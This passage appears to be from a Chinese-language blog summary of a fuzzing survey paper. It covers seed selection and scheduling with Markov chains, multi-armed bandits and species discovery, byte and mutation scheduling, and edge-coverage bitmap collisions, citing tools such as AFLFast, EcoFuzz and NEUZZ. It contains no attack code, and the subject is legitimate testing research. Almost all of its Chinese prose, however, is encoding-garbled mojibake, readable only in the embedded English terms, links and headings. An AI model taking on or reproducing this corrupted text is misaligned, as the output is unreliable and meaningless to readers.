</p><blockquote><p>ä½†æ‰§è¡ŒçŠ¶æ€å¹¶ä¸é™åˆ¶äºä»£ç è¦†ç›–ç‡ï¼Œå¯¹é¢å‘å¯¹è±¡ç¨‹åºï¼ˆobject-oriented programsï¼‰è€Œè¨€ä¹Ÿå¯ä»¥æ˜¯æ‰§è¡Œçš„åˆæ³•æ€§ï¼ˆlegalityï¼‰ï¼Œå¯¹åè®®å®ç°ï¼ˆprotocol implementationsï¼‰å¯ä»¥æ˜¯çŠ¶æ€æœºï¼ˆstate machineï¼‰ï¼Œå¯¹å¹¶å‘å®ç°ï¼ˆconcurrencyï¼‰å¯ä»¥æ˜¯ alias coverageï¼Œå¯¹æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼ˆdeep learning modelsï¼‰å¯ä»¥æ˜¯ç¥ç»è¦†ç›–ç‡ï¼ˆneuron coverageï¼‰ï¼Œå¯¹å®‰å“æ™ºèƒ½ç”µè§†åˆ™å¯ä»¥æ˜¯æ‰§è¡Œæ—¥å¿—ï¼ˆexecution logsï¼‰</p></blockquote><p>Fuzzer é€šå¸¸ä½¿ç”¨ <em>å´©æºƒ</em> ï¼ˆcrashesï¼‰ä½œä¸ºå®‰å…¨æ¼æ´çš„æŒ‡ç¤ºå™¨ï¼Œå› ä¸º crashes æä¾›äº†ç›´æ¥çš„è‡ªåŠ¨è®°å½•ï¼ˆOS ä¼šè‡ªåŠ¨å‘å‡ºä¿¡å·å‘ŠçŸ¥ç¨‹åºå´©æºƒï¼‰ï¼Œç„¶è€Œæœ‰çš„ç¼ºé™·å¹¶ä¸ä¼šæ˜¾ç¤ºå‡º crashesï¼Œå› æ­¤ fuzzer ä½¿ç”¨å…¶ä»–çš„æŒ‡ç¤ºå™¨ï¼Œä¾‹å¦‚ physical safety violation</p><p>ä½† indicators ä»…æ˜¾ç¤ºäº†å¯èƒ½çš„å®‰å…¨é—®é¢˜ï¼Œè¿˜éœ€è¦å®‰å…¨å·¥å…·æˆ–äººå·¥ç¡®è®¤è¿™æ˜¯ä¸€ä¸ª <em>æ¼æ´</em> ï¼ˆvulnerabilityï¼‰</p><h1>0x03. FUZZING THEORY</h1><p>ä¸ºäº†æé«˜å‘ç°æ¼æ´çš„æ¦‚ç‡ï¼Œfuzzer åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä½¿ç”¨åé¦ˆï¼ˆfeedbackï¼‰æœºåˆ¶ï¼Œä¾‹å¦‚ä»¥æ‰§è¡ŒçŠ¶æ€æˆ–ç»“æœä½œä¸º fitnesï¼Œä¸€ä¸ªå…¸å‹çš„ fitness ä¾¿æ˜¯åŸºäºä»£ç è¦†ç›–ç‡ï¼ˆä¾‹å¦‚åŸºæœ¬å—æˆ–è¾¹ï¼‰è¿›è¡Œè¾“å…¥ç”Ÿæˆï¼Œä½†ä»…æœ‰ä»£ç è¦†ç›–ç‡<strong>å¹¶éä¸€ç›´éƒ½æ˜¯å¯é çš„</strong>ï¼Œå°±ç®—å¯é ä¹Ÿå¯èƒ½æ”¶ç›Šä¸é«˜ï¼ˆä¾‹å¦‚æŒ‡æ•°å‹æ•°é‡çš„è¾“å…¥ç”Ÿæˆå¯èƒ½åªå¸¦æ¥çº¿æ€§çš„æ¼æ´å‘ç°ï¼‰ï¼Œå› æ­¤ä¸€ç§å¸¸è§çš„æ”¹è¿›æ–¹æ³•æ˜¯ä¼˜åŒ–æ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹æˆ–æ˜¯ä¸º fitness ä¸°å¯Œä¿¡æ¯ï¼ŒTable 1 å±•ç¤ºäº†ä¸åŒçš„ fuzzer çš„ä¼˜åŒ–æ–¹æ³•ï¼š</p><p><img src="https://s2.loli.net/2022/10/26/tgGbHp5JRn8zkIS.png" alt="Table 1. Fuzzers and their optimization solutions. "></p><h2 id="3-1-Seed-Set-Selection">3.1 Seed Set Selection</h2><p>å¯¹ç§å­é›†çš„ä¼˜åŒ–å…³æ³¨äº<strong>æœ€å°åŒ–ç§å­é›†çš„å¤§å°</strong>ï¼Œä¾‹å¦‚é€‰æ‹©èƒ½è¦†ç›–æ‰€æœ‰å·²å‘ç°ä»£ç è¦†ç›–çš„ä¸€ç»„æœ€å°‘çš„ç§å­ï¼Œå› ä¸ºè¿‡äºå¯Œé›†çš„ç§å­ä¼šåœ¨æ£€éªŒå·²æ¢æµ‹ä»£ç åŒºåŸŸä¸Šæµªè´¹è®¡ç®—èµ„æº</p><blockquote><p>åœ¨ <a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/rebert">UESIX çš„ä¸€ç¯‡è®ºæ–‡</a> ä¸­å…¶è¢«è¡¨è¿°ä¸º <em>æœ€å°è¦†ç›–é›†é—®é¢˜</em> ï¼ˆminimal set coverage problemï¼ŒMSCPï¼‰</p></blockquote><h2 id="3-2-Seed-Schedule">3.2 Seed Schedule</h2><p><strong>ç§å­è°ƒåº¦</strong>ï¼ˆseed scheduleï¼‰æœŸæœ›è§£å†³å¦‚ä¸‹é—®é¢˜ï¼š</p><ul><li>åœ¨ä¸‹ä¸€è½®ä¸­é€‰æ‹©å“ªä¸ªç§å­</li><li>ä¸ºè¯¥ç§å­åˆ†é…çš„æ—¶é—´é¢„ç®—ï¼ˆtime budgetï¼‰ï¼›å¤§éƒ¨åˆ† fuzzer å®é™…ä¸Šé€‰æ‹©ä¼˜åŒ–å¯¹è¢«é€‰å–ç§å­çš„å˜å¼‚æ¬¡æ•°</li></ul><p>ç”±äº PUTs ä¸æ¼æ´çš„å¤æ‚æ€§ï¼Œæœªå‘ç°ä»£ç è¦†ç›–ç‡ä¸æœªå‘ç°æ¼æ´æ˜¯ä¸å¯çŸ¥çš„ï¼Œæˆ‘ä»¬æ— æ³•çŸ¥é“ä¸€ä¸ªè¾“å…¥æ˜¯å¦èƒ½è§¦å‘æ¼æ´ï¼Œç±»ä¼¼åœ°åœ¨æ£€ç´¢ä»£ç ä¹‹å‰æˆ‘ä»¬ä¹Ÿä¸èƒ½è·å¾—ç¨‹åºè¡Œä¸ºçš„æ¦‚ç‡åˆ†å¸ƒï¼Œå› æ­¤æ•°å­¦ä¸Šæˆ‘ä»¬å‡ ä¹ä¸å¯èƒ½æ‰¾åˆ°ä¸€ä¸ªå…¨é¢çš„ä¼˜åŒ–è§£æ³•ï¼Œå› æ­¤ç ”ç©¶äººå‘˜åŸºäºå¤šç§ä¼˜åŒ–æ–¹æ³•æ¥è¿‘ä¼¼åœ°è§£å†³è¿™ä¸ªé—®é¢˜</p><h3 id="3-2-1-Fitness-by-Bugs"><em>3.2.1 Fitness by #Bugs</em></h3><p>é€šå¸¸è€Œè¨€åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­ä½¿ç”¨ä¸¤ç§ fitness è¿›è¡Œä¼˜åŒ–ï¼š1ï¼‰åŸºäºæ¼æ´ 2ï¼‰åŸºäºæ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚ä»£ç è¦†ç›–ç‡ï¼‰</p><p>ç”±äº fuzzing çš„ç›®çš„æ˜¯å‘ç°æ¼æ´ï¼Œå‘ç°æ¼æ´çš„æ•°é‡ä¾¿æ˜¯ä¸€ç§æœ€ç®€å•çš„ fitnessï¼Œä¸€ç§æ–¹æ³•ä¾¿æ˜¯åœ¨éšæœº/é¡ºåºé€‰æ‹©ç§å­çš„æ—¶å€™è°ƒåº¦æ¯ä¸ªç§å­çš„æ—¶é—´é¢„ç®—ï¼Œåœ¨ä¸è€ƒè™‘æ‰§è¡ŒçŠ¶æ€çš„æƒ…å†µä¸‹ï¼Œ <em>æœ€å¤§åŒ–æ¼æ´æ•°é‡é—®é¢˜</em>  å¯ä»¥è¢«ç®€åŒ–ä¸ºä¸€ä¸ª <strong>æ•´æ•°çº¿æ€§è§„åˆ’</strong>ï¼ˆInteger Linear Programmingï¼ŒILPï¼‰é—®é¢˜ï¼Œå³åœ¨çº¿æ€§çº¦æŸä¸‹æœ€å¤§åŒ–æ¼æ´æ•°é‡â€”â€”ä»¥è§£å†³è¿™æ ·çš„ ILP é—®é¢˜æ¥è‡ªåŠ¨è®¡ç®—æ¯ä¸ªç§å­çš„æ—¶é—´é¢„ç®—</p><p>å¦å¤–ä¸€ç§è®¤çŸ¥æ˜¯å°†æ¼æ´å‘ç°çš„è¿‡ç¨‹è§†ä½œ <strong>å¸¦æƒå¥–åˆ¸æ”¶é›†é—®é¢˜</strong>ï¼ˆWeighted Coupon Collectorâ€™s Problemï¼Œ<s>ä¸æ‡‚çš„å»ºè®®ç¿»æ¦‚ç‡è®ºè¯¾æœ¬è™½ç„¶ğŸ‘´çš„æ¦‚ç‡è®ºä¹Ÿæ˜¯æŒ‚å¾—ä¸€å¡Œç³Šæ¶‚</s>ï¼‰ï¼šfuzzing ä¸­å‘ç°çš„æ¯ä¸ªç‹¬ç‰¹çš„æ¼æ´éƒ½è¢«è§†ä½œä¸€ç§â€œå¥–åˆ¸â€ï¼ŒWCCP æœŸæœ›ä»¥æ­¤é¢„æµ‹å‘ç°ä¸‹ä¸ªâ€œå¥–åˆ¸â€æ‰€éœ€è¦çš„å°è¯•çš„æ•°é‡ï¼ˆæ—¶é—´é¢„ç®—ï¼‰</p><p>ILP ä¸ WCCP éƒ½æ˜¯ä¸ºäº†å°†æ›´å¤šçš„æ—¶é—´äºæ˜¯åˆ†é…ç»™æ›´æœ‰æ½œåŠ›çš„ç§å­ä»¥å‘ç°æ›´å¤šæ¼æ´</p><h3 id="3-2-2-Fitness-by-State-Transitionï¼ˆMarkov-Chainï¼‰"><em>3.2.2 Fitness by State Transitionï¼ˆMarkov Chainï¼‰</em></h3><p>ç”±äºæ¼æ´åœ¨ PUTs ä¸­çš„åˆ†å¸ƒæ˜¯åˆ†æ•£çš„ï¼Œè‹¥ä»¥å·²å‘ç°æ¼æ´ä¸º fitnessï¼Œåˆ™ fuzzing åªä¼šå…³æ³¨ä¸å·²å‘ç°æ¼æ´ç›¸å…³çš„ä»£ç åŒºåŸŸï¼Œè¿™æœ‰å¯èƒ½æ— æ³•è·å¾—æ›´å¤šçš„ä»£ç è¦†ç›–ï¼Œè¿™ç§æƒ…å†µä¸‹éœ€è¦å¤æ‚æ¡ä»¶çš„ <em>æ·±å±‚æ¼æ´</em> åˆ™èƒ½é€ƒè¿‡ fuzzer çš„æ³•çœ¼</p><p>ä¸ºäº†ç¼“è§£è¿™ä¸ªé—®é¢˜ï¼Œfuzzer åŸºäº<strong>æ‰§è¡ŒçŠ¶æ€</strong>ï¼ˆexecution stateï¼Œä¾‹å¦‚ä»£ç è¦†ç›–ç‡ï¼‰è®¡ç®— fitnessï¼Œå› ä¸ºæ‰§è¡ŒçŠ¶æ€èƒ½æä¾›æ›´å¤šçš„ä¿¡æ¯ï¼›ç°æœ‰çš„ fuzzer é€šå¸¸ä½¿ç”¨ä»£ç è¦†ç›–ç‡æ¥è®¡ç®— fitnessï¼Œå› ä¸ºæ›´é«˜çš„ä»£ç è¦†ç›–ç‡æ„å‘³ç€æ›´é«˜çš„å‘ç°æ¼æ´çš„å¯èƒ½æ€§</p><p>å¦‚ Fig2 æ‰€ç¤ºï¼Œè‹¥æ¨¡ç³Šæµ‹è¯•èƒ½æˆåŠŸåœ°è¡¨ç¤ºçŠ¶æ€è¿ç§»ï¼Œå…¶èƒ½é«˜æ•ˆåœ°æŒ‡å¼•æ¨¡ç³Šæµ‹è¯•ä»¥æ¢ç´¢æœªå‘ç°çš„çŠ¶æ€ï¼Œä¸€ä¸ªçƒ­é—¨çš„å»ºæ¨¡æ–¹æ³•ä¾¿æ˜¯ <strong>é©¬å°”ç§‘å¤«é“¾</strong>ï¼ˆMarkov Chainï¼‰ï¼Œå…¶ä¸­ä¸€ç§è§£å†³æ–¹æ¡ˆæ˜¯å°† CFGs ä¸­çš„ä¸€ä¸ªåŸºæœ¬å—è§†ä½œä¸€ä¸ªçŠ¶æ€ï¼ŒçŠ¶æ€è½¬ç§»å³ä¸ºåŸºæœ¬å—çš„æ‰§è¡Œè¿ç§»ï¼Œfuzzer é€šè¿‡åœ¨ fuzzing è¿‡ç¨‹ä¸­è®°å½•åŸºæœ¬å—çš„è·³è½¬é¢‘ç‡æ¥è®¡ç®—æ¦‚ç‡</p><blockquote><p>ç®€è€Œè¨€ä¹‹ï¼Œé©¬å°”ç§‘å¤«é“¾ç»´æŠ¤ä¸€ä¸ªæ¦‚ç‡è¡¨ï¼ˆprobability tableï¼‰ï¼Œå…ƒç´  <em>p<sub>ij</sub></em> è¡¨ç¤ºä»çŠ¶æ€ <em>i</em> è½¬ç§»åˆ°çŠ¶æ€ <em>j</em> çš„æ¦‚ç‡</p><p><img src="https://s2.loli.net/2022/10/26/NFoAY1aEyUGvxVi.png" alt="image.png"></p></blockquote><p>æœ‰äº†åŸºäºé©¬å°”ç§‘å¤«é“¾è®¡ç®—çš„ fitnessï¼Œfuzzer å¯ä»¥æŒ‡å¯¼ç®—åŠ›çš„åˆ†é…ï¼Œæˆ–æ˜¯é€‰æ‹©ä½¿ç”¨ç¬¦å·æ‰§è¡Œè§£å†³æœ€å›°éš¾çš„è·¯å¾„ï¼ˆæœ€ä½çš„è½¬ç§»æ¦‚ç‡ï¼‰ï¼›é€šå¸¸è€Œè¨€ï¼Œè½¬ç§»æ¦‚ç‡è¶Šä½ï¼Œfitness è¶Šå¥½ï¼Œå› ä¸ºèƒ½è½»æ˜“åˆ°è¾¾çš„ä»£ç åŒºåŸŸä¼šæ¯”éš¾ä»¥åˆ°è¾¾çš„åŒºåŸŸæ›´å®¹æ˜“è¢«å……åˆ†æ¢ç´¢</p><p>åŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•ä¸­é€šè¿‡å¯¹ç§å­è¿›è¡Œå˜å¼‚ç”Ÿæˆæ–°çš„è¾“å…¥ï¼Œæ¯æ¬¡è¾“å…¥è¿è¡Œäº†ä¸€æ¡æ‰§è¡Œé“¾ï¼Œè¿™æä¾›äº†å¦ä¸€ç§åŸºäºé©¬å°”ç§‘å¤«é“¾çš„è§†è§’ï¼šçŠ¶æ€è¢«å®šä¹‰ä¸ºä¸€ä¸ªè¾“å…¥çš„ä¸€æ¡æ‰§è¡Œè·¯å¾„ï¼ŒçŠ¶æ€è½¬ç§»åˆ™ä¸ºå¯¹è¾“å…¥ <em>t<sub>i</sub></em> çš„å˜å¼‚ï¼Œç”Ÿæˆæ–°çš„è¾“å…¥ <em>t<sub>j</sub></em> ï¼Œå³ç”±è·¯å¾„ <em>i</em> è¿ç§»åˆ°è·¯å¾„  <em>j</em> ï¼Œfuzzer åœ¨ fuzzing è¿‡ç¨‹ä¸­åŠ¨æ€è®¡ç®—è·¯å¾„è¿ç§»çš„æ¦‚ç‡</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://ieeexplore.ieee.org/abstract/document/8233151">AFLFast</a></p></blockquote><h3 id="3-2-3-Fitness-by-State-Transitionï¼ˆMulti-Armed-Banditï¼‰"><em>3.2.3 Fitness by State Transitionï¼ˆMulti-Armed Banditï¼‰</em></h3><p>é©¬å°”ç§‘å¤«é“¾éœ€è¦åŸºäºå¯¹æ‰€æœ‰çŠ¶æ€å·²çŸ¥æ¥åšå‡ºåˆé€‚é€‰æ‹©ï¼Œä½†åœ¨ fuzzing è¿‡ç¨‹ä¸­å¹¶éæ‰€æœ‰çŠ¶æ€éƒ½å·²è¢«æ‰§è¡Œï¼Œå› æ­¤é©¬å°”ç§‘å¤«é“¾å¹¶éæœ€ä¼˜è§£</p><p>å¯¹äºåŸºæœ¬å—è½¬ç§»ï¼Œå¯ä»¥åœ¨æ•°æ®ç»Ÿè®¡ä¸­ä½¿ç”¨ <em>rule of three</em> ï¼ˆğŸ‘´ä¹Ÿä¸çŸ¥é“å•¥ç©æ„ï¼Œå¦¹æŸ¥åˆ°ï¼‰ï¼›å¯¹äºè·¯å¾„è½¬ç§»ï¼Œå¯ä»¥ä½¿ç”¨è½®è¯¢è°ƒåº¦ç®—æ³•å°†æ—¶é—´é¢„ç®—å¹³å‡åˆ†é…ç»™æ¯ä¸ªç§å­ï¼Œç„¶è€Œè¿™ç§æ–¹æ³•æ— æ³•å†³å®šä»€ä¹ˆæ—¶å€™ä»è½®è¯¢è°ƒåº¦åˆ‡æ¢åˆ°é©¬å°”ç§‘å¤«é“¾â€”â€”åœ¨éå†æ‰€æœ‰ç§å­ä¸å…³æ³¨ç‰¹ç‚¹ç§å­é—´è¿›è¡Œå¹³è¡¡ï¼Œè¿™ä¾¿æ˜¯ä¸€ä¸ªç»å…¸çš„ <code>exploration vs. exploitation</code> é—®é¢˜</p><p>ä¸€ä¸ªæ›´å¥½çš„è§£å†³  <code>exploration vs. exploitation</code>  é—®é¢˜çš„æ–¹æ³•ä¾¿æ˜¯ä½¿ç”¨ <strong>å¤šè‡‚è€è™æœº</strong>ï¼ˆMulti-Armed Banditï¼ŒMABï¼Œ<s>åˆåˆ°äº†æ¦‚ç‡è®ºå­¦å¾—ç¨€çƒ‚çš„ğŸ‘´æ‰£é—®å·çš„æ—¶é—´</s>ï¼‰è¡¨ç¤ºè·¯å¾„è½¬ç§»ï¼šç§å­ <em>t<sub>i</sub></em> è¢«è§†ä½œä¸€æ¡â€œè‡‚â€ï¼Œâ€œå¥–åŠ±â€åˆ™æ˜¯ç”±ç§å­ <em>t<sub>i</sub></em> ç”Ÿæˆçš„ä¸€æ¡æ–°è·¯å¾„çš„å‘ç°</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/yue">EcoFuzz</a></p></blockquote><h3 id="3-2-4-Fitness-by-State-Discovery"><em>3.2.4 Fitness by State Discovery</em></h3><p>é©¬å°”ç§‘å¤«é“¾ä¸å¤šè‡‚è€è™æœºéƒ½èƒ½è¡¨ç¤ºç¨‹åºçš„çŠ¶æ€è¿ç§»ï¼Œç„¶è€Œæ¨¡ç³Šæµ‹è¯•çš„åŸºæœ¬ç›®æ ‡æ˜¯å‘ç°æ–°çš„çŠ¶æ€ï¼ˆæ–°çš„ä»£ç è¦†ç›–ç‡ã€æ–°çš„æ¼æ´ã€æ–°çš„å´©æºƒï¼‰ï¼Œç”±æ­¤æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ª <strong>ç‰©ç§å‘ç°é—®é¢˜</strong>ï¼ˆspecies discovery problemï¼‰ï¼š <em>ç”Ÿæ€å­¦å®¶ä»é‡å¤–æ”¶é›†å¤§é‡æ ·æœ¬ï¼Œæ ·æœ¬ä¸­çš„ç‰©ç§å¯èƒ½ä¸°å¯Œæˆ–ç¨€å°‘ï¼Œç”Ÿæ€å­¦å®¶ä»¥æ­¤æ¨æ–­é›†èšçš„æ€§è´¨ï¼ŒåŒ…æ‹¬æœªå‘ç°çš„æ ·æœ¬</em> â€”â€”ç±»ä¼¼åœ°ï¼Œ<strong>ç”± fuzzer ç”Ÿæˆçš„è¾“å…¥å³ä¸ºâ€œå·²æ”¶é›†åˆ°çš„æ ·æœ¬â€ï¼Œè¾“å…¥ç©ºé—´å³ä¸ºâ€œé›†èšâ€ï¼ˆassemblageï¼‰</strong>ï¼Œfuzzing åŸºäºç‰¹å®šæ ‡å‡†å°†è¾“å…¥è¿›è¡Œåˆ†ç±»</p><blockquote><p>ä¾‹å¦‚ä¸€æ¡æ‰§è¡Œè·¯å¾„å¯ä»¥æ˜¯ä¸€ä¸ªç‰©ç§ï¼Œæ‰§è¡Œè¿™æ¡è·¯å¾„çš„è¾“å…¥å±äºè¯¥ç‰©ç§ï¼Œä¸€ä¸ªç¨€æœ‰ç‰©ç§å³ä¸ºè¾ƒå°‘è¾“å…¥æ‰§è¡Œåˆ°çš„è·¯å¾„ï¼Œè¿™å¼•å¯¼ç€ fuzzer å»å‘ç°æ–°çš„â€œç‰©ç§â€â€”â€”æ–°çš„è·¯å¾„â†’æ–°çš„çŠ¶æ€</p></blockquote><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://mboehme.github.io/paper/FSE20.Entropy.pdf">Entropic</a></p></blockquote><h2 id="3-3-Byte-Schedule">3.3 Byte Schedule</h2><p><strong>å­—èŠ‚è°ƒåº¦</strong>ï¼ˆByte Scheduleï¼‰å†³å®šäº† <em>é€‰æ‹©ç§å­ä¸­ä¸€ä¸ªå­—èŠ‚æ¥å˜å¼‚</em> çš„é¢‘ç‡ã€‚å¤§éƒ¨åˆ† fuzzer åŸºäºæ‰§è¡Œä¿¡æ¯æ¥è¯•æ¢æ€§åœ°æˆ–éšæœºåœ°é€‰æ‹©å­—èŠ‚ï¼Œè¿™éœ€è¦æ¯” seed schedule å¯¹ç¨‹åºè¡Œä¸ºæœ‰ç€æ›´æ·±åˆ»çš„äº†è§£ï¼ˆä¾‹å¦‚è·¯å¾„çº¦æŸæˆ–æ•°æ®æµï¼‰ï¼Œç”±æ­¤ fuzzer å¯ä»¥å…³æ³¨äºä¸€ä¸ªä¸é‚£ä¹ˆå¤æ‚çš„é—®é¢˜â€”â€”å­—èŠ‚å¦‚ä½•å½±å“æ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹ï¼Œç§°ä¸ºå­—èŠ‚çš„<strong>é‡è¦æ€§</strong>ï¼ˆimportanceï¼‰</p><p>ç”±äºå¤§éƒ¨åˆ†ç°ç›’ fuzzer ä½¿ç”¨ <em>è¾¹è¦†ç›–ç‡</em> æ¥æµ‹è¯• PUTsï¼Œç¬¬ä¸€ç§æ–¹æ³•ä¾¿æ˜¯å°†é‡è¦æ€§å®šä¹‰ä¸º <em>å­—èŠ‚å¦‚ä½•å½±å“åˆ†æ”¯è¡Œä¸º</em></p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™äº›ä¾‹å­ï¼š<a href="https://arxiv.org/abs/1807.05620">NEUZZ</a>ã€<a href="https://arxiv.org/abs/2005.12392">MTFuzz</a></p></blockquote><p>å¦ä¸€ç§é‡åŒ–å­—èŠ‚çš„é‡è¦æ€§çš„æ–¹æ³•æ˜¯åŸºäºç§å­çš„ fitness è¿›è¡Œå®šä¹‰ï¼Œåœ¨ fuzzing è¿‡ç¨‹ä¸­å¯ä»¥å…³æ³¨èƒ½æå‡ fitness çš„å­—èŠ‚ï¼šè‹¥å¯¹äºä¸€ä¸ªå­—èŠ‚çš„æ”¹å˜æå‡äº†ç§å­çš„ fitnessï¼Œåˆ™å¢åŠ è¯¥ç§å­çš„åˆ†æ•°</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://dl.acm.org/doi/10.1145/3460120.3484596">AFLChurn</a></p></blockquote><h2 id="3-4-Mutation-Operator-Schedule">3.4 Mutation Operator Schedule</h2><p>å¦‚ Fig2 æ‰€ç¤ºï¼Œè¾“å…¥ç”Ÿæˆå™¨çš„æœ€åä¸€æ­¥æ˜¯é€‰æ‹©ä¸€ä¸ªå˜å¼‚å™¨ï¼ˆmutation operatorï¼Œå³mutatorï¼‰æ¥å¯¹é€‰æ‹©çš„å­—èŠ‚è¿›è¡Œå˜å¼‚ï¼Œ<strong>å˜å¼‚è°ƒåº¦</strong>ï¼ˆmutation scheduleï¼‰å†³å®šäº†ä¸‹æ¬¡å˜å¼‚æ‰€ç”¨çš„å˜å¼‚å™¨</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://dl.acm.org/doi/10.1145/2908080.2908095">Classfuzz</a>ï¼šä½¿ç”¨ <em>é©¬å°”ç§‘å¤«é“¾è’™ç‰¹å¡æ´›æ–¹æ³•</em> ï¼ˆMarkov chain Monte Carloï¼‰ å»ºæ¨¡å˜å¼‚è°ƒåº¦</li><li><a href="">MOPT</a>ï¼šä½¿ç”¨ <em>ç²’å­ç¾¤ä¼˜åŒ–</em> ï¼ˆParticle swarm optimizationï¼‰å»ºæ¨¡å˜å¼‚é€‰æ‹©è¿‡ç¨‹</li></ul></blockquote><h2 id="3-5-Diverse-Information-For-Fitness">3.5 Diverse Information For Fitness</h2><p>Fitness é™¤äº†è°ƒåº¦ç§å­ã€å­—èŠ‚ã€å˜å¼‚å™¨ä»¥å¤–ï¼Œè¿˜å¯ä»¥è¢«ç”¨äºæŒ‡å¯¼ç§å­å­˜ç•™ï¼šè¾“å…¥ç”±ç§å­å˜å¼‚è€Œæ¥ï¼Œè‹¥ä¸€ä¸ªè¾“å…¥æ¢ç´¢åˆ°æ–°çš„æ‰§è¡ŒçŠ¶æ€ï¼Œå…¶ä¾¿è¢«ä¿ç•™ä¸ºæ–°çš„ç§å­ï¼Œåœ¨ç§å­è°ƒåº¦ä¸­å¸¸é€‰æ‹©æ–°çš„ç§å­ï¼›å¤§éƒ¨åˆ†çš„è¦†ç›–ç‡æŒ‡å¯¼çš„ fuzzer åŸºäºè¾¹è¦†ç›–ç‡æ¥ä¿ç•™ç§å­</p><p>ä¸ºäº†æé«˜å‘ç°æ¼æ´çš„èƒ½åŠ›ï¼Œéœ€è¦æ›´æ•æ„Ÿçš„ä»£ç è¦†ç›–ç‡å¸¦æ¥æ›´å¤šçš„æ‰§è¡ŒçŠ¶æ€ä¿¡æ¯ï¼›å¦ä¸€æ–¹é¢ï¼Œæ–°ç±»å‹çš„ fitness ä¹Ÿè¢«ä¸ºä¸€äº›ç‰¹æ®Šåœºæ™¯è®¾è®¡äº†å‡ºæ¥ï¼Œä¾‹å¦‚æ·±åº¦å­¦ä¹ æ¨¡å‹æˆ–æœºå™¨è£…ç½®</p><p><img src="https://s2.loli.net/2022/10/26/PbVfo5HKp9e6aBy.png" alt="Fig. 3. Sensitivity and limitation of code coverage."></p><h3 id="3-5-1-Sensitive-Code-Coverage">3.5.1 Sensitive Code Coverage</h3><p>fitness çš„æ•æ„Ÿåº¦æ ‡è¯†åŒºåˆ†æ‰§è¡ŒçŠ¶æ€çš„èƒ½åŠ›ï¼Œå¤§éƒ¨åˆ†è¦†ç›–ç‡æŒ‡å¯¼çš„ fuzzer ä½¿ç”¨ä¸€ä¸ªä½å›¾æ¥æä¾›è¾¹è¦†ç›–ç‡ä¿¡æ¯ï¼š</p><ul><li>ä½å›¾ä¸­çš„æ¯ä¸ªå…ƒç´ ä¸‹æ ‡è¡¨ç¤ºä¸€ä¸ªè¾¹æ ‡è¯†ç¬¦ï¼ˆedge identifierï¼‰ï¼Œå¹¶ä¸ºè¾¹æ ‡è¯†ç¬¦è®¡ç®—å“ˆå¸Œå€¼ <em>hash(b<sub>i</sub>, b<sub>j</sub>)</em> ï¼Œå…¶ä¸­ <em>b<sub>i</sub></em> ä¸ <em>b<sub>j</sub></em> ä¸ºéšæœºæŒ‡æ´¾çš„åŸºæœ¬å—æ ‡è¯†ç¬¦ï¼ˆblock identifierï¼‰</li></ul><p>å°½ç®¡è¿™ç§æ–¹æ³•æ‰§è¡Œå¾—å¾ˆå¿«ï¼Œä½†å…¶èˆå¼ƒäº†å¯¹è¾¹è¦†ç›–ç‡çš„é¢„æµ‹ï¼ŒåŒæ—¶è¿™ç§ç»´æŠ¤è¾¹è¦†ç›–ç‡çš„å®ç°å¯¼è‡´äº†<strong>è¾¹ç¢°æ’</strong>ï¼ˆedge collisionï¼‰é—®é¢˜ï¼ˆä¾‹å¦‚ä¸¤æ¡ä¸åŒçš„è¾¹è¢«åˆ†é…äº†åŒä¸€ä¸ªæ ‡è¯†ç¬¦ï¼‰ï¼Œä¸ºäº†åˆ†é…å”¯ä¸€çš„è¾¹æ ‡è¯†ç¬¦ï¼Œfuzzer éœ€è¦å°å¿ƒåœ°åˆ†é…å—æ ‡è¯†ç¬¦ä¸”æä¾›æ›´ç²¾ç¡®çš„å“ˆå¸Œå‡½æ•°</p><blockquote><p>å¦‚ Fig3.a æ‰€ç¤ºï¼Œè‹¥ <em>id<sub>AB</sub></em> == <em>id<sub>AC</sub></em> ä¸”  <em>id<sub>BD</sub></em> == <em>id<sub>CD</sub></em> ï¼Œåˆ™è·¯å¾„ <code>ABD</code> ä¸ <code>ACD</code> è¢«å½“ä½œåŒä¸€æ¡è·¯å¾„ï¼Œåœ¨è¿™ç§è®¾æƒ³ä¸‹ fuzzer æ— æ³•è·å¾—æ–°çš„è¦†ç›–ç‡ï¼Œå…¶ä¼š<strong>å¿½ç•¥</strong>æ¼æ´è·¯å¾„ <code>ACDEG</code></p></blockquote><p>Fuzzer é€šè¿‡ä½å›¾ä¾¿èƒ½ç¡®å®šä¸€ä¸ªè¾“å…¥æ˜¯å¦äº§ç”Ÿäº†æ–°çš„è¾¹ï¼›ç‰¹åˆ«åœ°ï¼Œfuzzer ç»´æŠ¤ä¸€ä¸ªæ€»ä½“ä½å›¾ï¼ˆoverall bitmapï¼Œç‹¬ç«‹æ‰§è¡Œä½å›¾ï¼ˆbitmap of individual executionï¼‰çš„é›†åˆï¼‰ï¼Œåœ¨ç¡®å®šæ–°çš„è¾¹æ—¶ï¼Œfuzzer å°†ç‹¬ç«‹ä½å›¾ä¸æ€»ä½“ä½å›¾å¯¹æ¯”ï¼Œä»¥æ£€æŸ¥è¿™æ¡æ–°çš„è¾¹æ˜¯å¦å­˜åœ¨äºç‹¬ç«‹ä½å›¾ä¸­ï¼Œç„¶è€Œä½å›¾é›†åˆä¸§å¤±äº†æ‰§è¡Œä¿¡æ¯</p><blockquote><p>ä¾‹å¦‚è‹¥ Fig3.a ä¸­çš„è·¯å¾„ <code>ABDEG</code> ä¸ <code>ACDFG</code> 